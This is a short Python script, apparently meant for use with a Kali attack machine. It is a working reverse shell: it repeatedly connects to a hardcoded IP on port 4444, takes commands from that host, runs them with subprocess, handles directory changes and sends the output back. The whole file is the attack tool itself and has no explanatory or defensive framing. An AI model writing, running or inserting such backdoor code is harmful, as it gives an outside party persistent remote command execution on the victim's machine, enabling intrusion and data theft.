import socket
import subprocess
import os

host = "192.168.0.168"  # replace with your Kali machine IP
port = 4444

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                s.close()
                break
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(b"Changed directory")
                except:
                    s.send(b"Failed to change directory")
                continue

            output = subprocess.getoutput(command)
            s.send(output.encode())
    except:
        continue
